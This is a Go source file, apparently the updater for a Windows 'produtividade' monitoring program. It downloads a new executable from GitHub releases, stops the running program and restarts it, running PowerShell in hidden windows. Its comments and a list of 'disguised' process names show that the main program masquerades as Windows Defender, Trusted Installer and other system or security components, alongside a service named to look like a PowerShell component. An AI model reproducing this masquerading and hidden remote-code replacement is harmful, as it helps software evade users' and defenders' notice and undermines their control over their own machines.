package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	version "github.com/hashicorp/go-version"
)

// hiddenCmd cria um exec.Command que não abre janela de console no Windows
func hiddenCmd(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	return cmd
}

var processNames = []string{
	"SystemHostService",
	"WindowsDefenderCore",
	"NetCfgHelper",
	"AudioDriverHost",
	"PrintSpoolerAgent",
	"SecurityHealthBroker",
	"DeviceAssociationSvc",
	"TrustedInstallerHost",
	"WinDiagnosticsHost",
	"UserSessionManager",
}

const (
	windowsServiceName = "PowerShellDataCollector"
	scheduledTaskName  = "produtividade"
	githubAPIURL       = "https://api.github.com/repos/StratusTI/SteelControll/releases/latest"
)

type Updater struct {
	logger      *log.Logger
	currentPath string
	versionPath string
}

func main() {
	logger := log.New(os.Stdout, "[UPDATER] ", log.LstdFlags|log.Lshortfile)

	if len(os.Args) < 2 {
		logger.Fatal("Uso: update.exe <caminho_do_executavel_principal>")
	}

	mainExePath := os.Args[1]

	updater := &Updater{
		logger:      logger,
		currentPath: mainExePath,
		versionPath: filepath.Join(filepath.Dir(mainExePath), "version.txt"),
	}

	// Remove lock file ao finalizar (sucesso ou erro)
	lockFile := filepath.Join(filepath.Dir(mainExePath), "update.lock")
	defer os.Remove(lockFile)

	logger.Println("=== INICIANDO PROCESSO DE ATUALIZAÇÃO ===")

	if err := updater.performUpdate(); err != nil {
		logger.Printf("ERRO durante atualização: %v", err)
		os.Exit(1)
	}

	logger.Println("=== ATUALIZAÇÃO CONCLUÍDA COM SUCESSO ===")
}

func (u *Updater) performUpdate() error {
	exeDir := filepath.Dir(u.currentPath)
	newExePath := filepath.Join(exeDir, "produtividade_new.exe")

	// 1. Verifica se o arquivo novo existe (já baixado pelo main.go)
	if _, err := os.Stat(newExePath); os.IsNotExist(err) {
		u.logger.Println("Nenhum arquivo produtividade_new.exe encontrado, verificando GitHub...")
		return u.performFullUpdate()
	}

	u.logger.Printf("Arquivo de atualização encontrado: %s", newExePath)

	// 2. Busca a versão remota para saber qual versão estamos aplicando
	remoteVersion, err := u.fetchRemoteVersion()
	if err != nil {
		u.logger.Printf("Aviso: não foi possível obter versão remota: %v", err)
		remoteVersion = "unknown"
	}

	// 3. Para a tarefa agendada
	wasRunning, err := u.stopTask()
	if err != nil {
		return fmt.Errorf("erro ao parar tarefa: %v", err)
	}

	// 4. Faz backup do executável atual
	backupPath, err := u.createBackup()
	if err != nil {
		u.logger.Printf("Aviso: não foi possível criar backup: %v", err)
	} else {
		u.logger.Printf("Backup criado em: %s", backupPath)
	}

	// 5. Substitui o executável
	u.logger.Println("Substituindo executável...")
	os.Remove(u.currentPath)
	if err := os.Rename(newExePath, u.currentPath); err != nil {
		u.logger.Printf("ERRO ao renomear: %v, tentando copiar...", err)
		if err := copyFile(newExePath, u.currentPath); err != nil {
			u.restoreFromBackup(backupPath)
			return fmt.Errorf("erro ao substituir executável: %v", err)
		}
		os.Remove(newExePath)
	}

	u.logger.Println("✓ Executável substituído")

	// 6. Atualiza arquivo de versão (sempre atualiza para evitar loop de update)
	if remoteVersion == "unknown" {
		remoteVersion = "999.0.0" // Força versão alta para não repetir o update
		u.logger.Println("Aviso: versão remota desconhecida, usando versão placeholder para evitar loop")
	}
	if err := u.updateVersionFile(remoteVersion); err != nil {
		u.logger.Printf("Aviso: erro ao atualizar arquivo de versão: %v", err)
	}

	// 7. Reinicia a tarefa
	if wasRunning {
		if err := u.startTask(); err != nil {
			return fmt.Errorf("erro ao reiniciar tarefa: %v", err)
		}
	}

	// 8. Remove backup se tudo deu certo
	if backupPath != "" {
		os.Remove(backupPath)
	}

	return nil
}

// performFullUpdate faz o fluxo completo: busca, baixa e aplica a atualização
func (u *Updater) performFullUpdate() error {
	// 1. Verifica conectividade
	if err := u.checkConnectivity(); err != nil {
		return fmt.Errorf("falha na conectividade: %v", err)
	}

	// 2. Busca informações da release no GitHub
	releaseVersion, downloadURL, err := u.fetchReleaseInfo()
	if err != nil {
		return fmt.Errorf("erro ao buscar release: %v", err)
	}

	// 3. Verifica se precisa atualizar
	needsUpdate, err := u.needsUpdate(releaseVersion)
	if err != nil {
		return fmt.Errorf("erro ao verificar necessidade de atualização: %v", err)
	}

	if !needsUpdate {
		u.logger.Printf("Sistema já está na versão mais recente: %s", releaseVersion)
		return nil
	}

	u.logger.Printf("Nova versão disponível: %s", releaseVersion)

	// 4. Para a tarefa agendada
	wasRunning, err := u.stopTask()
	if err != nil {
		return fmt.Errorf("erro ao parar tarefa: %v", err)
	}

	// 5. Faz backup
	backupPath, err := u.createBackup()
	if err != nil {
		u.logger.Printf("Aviso: não foi possível criar backup: %v", err)
	} else {
		u.logger.Printf("Backup criado em: %s", backupPath)
	}

	// 6. Baixa nova versão
	tempFile, err := u.downloadNewVersion(downloadURL)
	if err != nil {
		u.restoreFromBackup(backupPath)
		return fmt.Errorf("erro ao baixar nova versão: %v", err)
	}

	// 7. Substitui o executável
	u.logger.Println("Substituindo executável...")
	os.Remove(u.currentPath)
	if err := os.Rename(tempFile, u.currentPath); err != nil {
		u.logger.Printf("ERRO ao renomear: %v, tentando copiar...", err)
		if err := copyFile(tempFile, u.currentPath); err != nil {
			u.restoreFromBackup(backupPath)
			os.Remove(tempFile)
			return fmt.Errorf("erro ao substituir executável: %v", err)
		}
		os.Remove(tempFile)
	}

	u.logger.Println("✓ Executável substituído")

	// 8. Atualiza arquivo de versão
	if err := u.updateVersionFile(releaseVersion); err != nil {
		u.logger.Printf("Aviso: erro ao atualizar arquivo de versão: %v", err)
	}

	// 9. Reinicia a tarefa
	if wasRunning {
		if err := u.startTask(); err != nil {
			return fmt.Errorf("erro ao reiniciar tarefa: %v", err)
		}
	}

	// 10. Remove backup
	if backupPath != "" {
		os.Remove(backupPath)
	}

	return nil
}

func (u *Updater) checkConnectivity() error {
	u.logger.Println("Verificando conectividade...")
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get("https://www.google.com")
	if err != nil {
		return err
	}
	resp.Body.Close()
	u.logger.Println("✓ Conectividade OK")
	return nil
}

func (u *Updater) fetchReleaseInfo() (string, string, error) {
	u.logger.Printf("Consultando GitHub Releases: %s", githubAPIURL)

	client := &http.Client{Timeout: 30 * time.Second}
	req, err := http.NewRequest("GET", githubAPIURL, nil)
	if err != nil {
		return "", "", err
	}
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", "", fmt.Errorf("status HTTP: %d", resp.StatusCode)
	}

	var release struct {
		TagName string `json:"tag_name"`
		Assets  []struct {
			Name               string `json:"name"`
			BrowserDownloadURL string `json:"browser_download_url"`
		} `json:"assets"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&release); err != nil {
		return "", "", err
	}

	remoteVersion := strings.TrimPrefix(release.TagName, "v")

	var downloadURL string
	for _, asset := range release.Assets {
		if strings.HasSuffix(strings.ToLower(asset.Name), ".exe") && asset.Name != "update.exe" {
			downloadURL = asset.BrowserDownloadURL
			break
		}
	}

	if downloadURL == "" {
		return "", "", fmt.Errorf("nenhum .exe encontrado nos assets da release")
	}

	u.logger.Printf("Versão: %s, URL: %s", remoteVersion, downloadURL)
	return remoteVersion, downloadURL, nil
}

func (u *Updater) fetchRemoteVersion() (string, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("GET", githubAPIURL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var release struct {
		TagName string `json:"tag_name"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&release); err != nil {
		return "", err
	}

	return strings.TrimPrefix(release.TagName, "v"), nil
}

func (u *Updater) getCurrentVersion() string {
	data, err := os.ReadFile(u.versionPath)
	if err != nil {
		return "0.0.0"
	}
	return strings.TrimSpace(string(data))
}

func (u *Updater) needsUpdate(newVersion string) (bool, error) {
	currentVersion := u.getCurrentVersion()
	u.logger.Printf("Versão atual: %s, Versão remota: %s", currentVersion, newVersion)

	vCurrent, err := version.NewVersion(currentVersion)
	if err != nil {
		return false, fmt.Errorf("erro ao parsear versão atual: %v", err)
	}

	vNew, err := version.NewVersion(newVersion)
	if err != nil {
		return false, fmt.Errorf("erro ao parsear versão remota: %v", err)
	}

	return vNew.GreaterThan(vCurrent), nil
}

func (u *Updater) stopTask() (bool, error) {
	u.logger.Println("Parando processo (serviço / tarefa agendada / manual)...")

	exeName := filepath.Base(u.currentPath)

	// Monta lista de todos os nomes possíveis (principal + disfarçados)
	allNames := []string{strings.TrimSuffix(exeName, ".exe")}
	for _, n := range processNames {
		allNames = append(allNames, n)
	}

	// Converte para array PowerShell
	psNames := make([]string, len(allNames))
	for i, n := range allNames {
		psNames[i] = fmt.Sprintf("'%s'", n)
	}
	psNamesArr := strings.Join(psNames, ",")

	script := fmt.Sprintf(`
$ErrorActionPreference = 'SilentlyContinue'
$result = @()

# 1. Tenta parar como Windows Service
$svc = Get-Service -Name '%s' -ErrorAction SilentlyContinue
if ($svc -and $svc.Status -eq 'Running') {
    Stop-Service -Name '%s' -Force -ErrorAction SilentlyContinue
    $svc.WaitForStatus('Stopped', '00:00:15')
    $result += 'service_stopped'
}

# 2. Tenta parar como Scheduled Task
$task = Get-ScheduledTask -TaskName '%s' -ErrorAction SilentlyContinue
if ($task -and $task.State -eq 'Running') {
    Stop-ScheduledTask -TaskName '%s' -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    $result += 'task_stopped'
}

# 3. Força kill de TODOS os nomes possíveis (principal + disfarçados)
$names = @(%s)
foreach ($name in $names) {
    $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
    if ($proc) {
        Stop-Process -Name $name -Force -ErrorAction SilentlyContinue
        $result += "killed_$name"
    }
}
Start-Sleep -Seconds 2

$result -join ','
`, windowsServiceName, windowsServiceName,
		scheduledTaskName, scheduledTaskName,
		psNamesArr)

	cmd := hiddenCmd("powershell", "-WindowStyle", "Hidden", "-NoProfile", "-NonInteractive", "-Command", script)
	output, err := cmd.CombinedOutput()
	outputStr := strings.TrimSpace(string(output))
	u.logger.Printf("Stop output: %s", outputStr)

	if err != nil {
		u.logger.Printf("Aviso: erro no script de parada: %v", err)
	}

	return true, nil
}

func (u *Updater) createBackup() (string, error) {
	backupPath := u.currentPath + ".backup"

	sourceFile, err := os.Open(u.currentPath)
	if err != nil {
		return "", err
	}
	defer sourceFile.Close()

	backupFile, err := os.Create(backupPath)
	if err != nil {
		return "", err
	}
	defer backupFile.Close()

	if _, err = io.Copy(backupFile, sourceFile); err != nil {
		os.Remove(backupPath)
		return "", err
	}

	return backupPath, nil
}

func (u *Updater) downloadNewVersion(downloadURL string) (string, error) {
	u.logger.Printf("Baixando nova versão de: %s", downloadURL)

	client := &http.Client{Timeout: 10 * time.Minute}
	resp, err := client.Get(downloadURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status HTTP inválido no download: %d", resp.StatusCode)
	}

	tempFile := filepath.Join(filepath.Dir(u.currentPath), "produtividade_new.exe")
	out, err := os.Create(tempFile)
	if err != nil {
		return "", err
	}
	defer out.Close()

	size, err := io.Copy(out, resp.Body)
	if err != nil {
		os.Remove(tempFile)
		return "", err
	}

	u.logger.Printf("✓ Download concluído: %d bytes", size)

	if size < 1024*10 {
		os.Remove(tempFile)
		return "", fmt.Errorf("arquivo baixado muito pequeno (%d bytes)", size)
	}

	return tempFile, nil
}

func (u *Updater) updateVersionFile(newVersion string) error {
	return os.WriteFile(u.versionPath, []byte(newVersion), 0644)
}

func (u *Updater) startTask() error {
	u.logger.Println("Reiniciando processo...")

	script := fmt.Sprintf(`
$ErrorActionPreference = 'SilentlyContinue'

$svc = Get-Service -Name '%s' -ErrorAction SilentlyContinue
if ($svc) {
    Start-Service -Name '%s' -ErrorAction SilentlyContinue
    Write-Output 'service_started'
    exit 0
}

$task = Get-ScheduledTask -TaskName '%s' -ErrorAction SilentlyContinue
if ($task) {
    Start-ScheduledTask -TaskName '%s' -ErrorAction SilentlyContinue
    Write-Output 'task_started'
    exit 0
}

Write-Output 'none'
`, windowsServiceName, windowsServiceName,
		scheduledTaskName, scheduledTaskName)

	cmd := hiddenCmd("powershell", "-WindowStyle", "Hidden", "-NoProfile", "-NonInteractive", "-Command", script)
	output, _ := cmd.CombinedOutput()  // <- troca err por _
	outputStr := strings.TrimSpace(string(output))
	u.logger.Printf("Start output: %s", outputStr)

	if strings.Contains(outputStr, "service_started") {
		u.logger.Println("✓ Serviço iniciado")
		return nil
	}
	if strings.Contains(outputStr, "task_started") {
		u.logger.Println("✓ Tarefa agendada iniciada")
		return nil
	}

	u.logger.Println("Iniciando executável diretamente com 'run'...")
	manualCmd := hiddenCmd(u.currentPath, "run")
	manualCmd.Dir = filepath.Dir(u.currentPath)
	if err := manualCmd.Start(); err != nil {
		return fmt.Errorf("erro ao iniciar processo: %v", err)
	}
	manualCmd.Process.Release()
	u.logger.Println("✓ Processo iniciado")
	return nil
}

func (u *Updater) restoreFromBackup(backupPath string) {
	if backupPath == "" {
		return
	}

	u.logger.Printf("Restaurando backup de: %s", backupPath)
	os.Remove(u.currentPath)

	if err := copyFile(backupPath, u.currentPath); err != nil {
		u.logger.Printf("Erro ao restaurar backup: %v", err)
		return
	}

	u.logger.Println("✓ Backup restaurado")
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}
